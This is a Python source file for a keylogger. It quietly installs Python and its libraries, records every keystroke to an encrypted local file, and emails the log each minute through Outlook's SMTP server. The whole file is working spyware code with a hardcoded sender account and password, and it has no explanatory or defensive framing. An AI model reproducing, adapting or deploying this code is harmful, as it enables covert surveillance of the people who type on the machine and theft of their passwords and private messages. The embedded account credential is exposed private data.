import subprocess
import sys
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from cryptography.fernet import Fernet
import schedule
import time

# Email details
sender_email = "test34124logger@outlook.com"
receiver_email = ""
subject = "Keylogger Data"
smtp_server = "smtp.office365.com"
smtp_port = 587
password = "Haydenandcarson12"

def install_python():
    if not os.path.exists("C:\\Python311\\python.exe"):
        python_installer = "python-3.11.9-amd64.exe"
        subprocess.run([python_installer, '/quiet', '/norestart'])

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def ensure_libraries_installed():
    try:
        import pynput
    except ImportError:
        install_package('pynput')
    
    try:
        import cryptography
    except ImportError:
        install_package('cryptography')
    
    try:
        import schedule
    except ImportError:
        install_package('schedule')

def get_encryption_key():
    try:
        with open('ekey.txt', 'r') as key_file:
            key = key_file.read().strip()
        return key.encode()
    except FileNotFoundError:
        raise ValueError("Encryption key file not found.")
    except Exception as e:
        raise ValueError(f"Error reading encryption key: {str(e)}")

def keyPressed(key):
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    try:
        with open("keyfile.txt", 'ab') as logKey:
            if hasattr(key, 'char') and key.char is not None:
                encrypted_char = cipher_suite.encrypt(key.char.encode())
                logKey.write(encrypted_char)
                logKey.write(b'\n')
            else:
                if key == keyboard.Key.space:
                    encrypted_space = cipher_suite.encrypt(b' ')
                    logKey.write(encrypted_space)
                    logKey.write(b'\n')
                else:
                    encrypted_special_key = cipher_suite.encrypt(f'[{key}]'.encode())
                    logKey.write(encrypted_special_key)
                    logKey.write(b'\n')
    except Exception as e:
        print(f"Error logging key: {str(e)}")  

    if key == keyboard.Key.esc:
        send_email()
        return False

def send_email():
    try:
        with open("keyfile.txt", 'rb') as file:
            file_content = file.read()

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject

        part = MIMEText(file_content.decode(), "plain")
        message.attach(part)

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {str(e)}")
    finally:
        server.quit()

if __name__ == "__main__":
    install_python()
    ensure_libraries_installed()

    open("keyfile.txt", 'wb').close()

    schedule.every(1).minutes.do(send_email)

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    while True:
        schedule.run_pending()
        time.sleep(1)
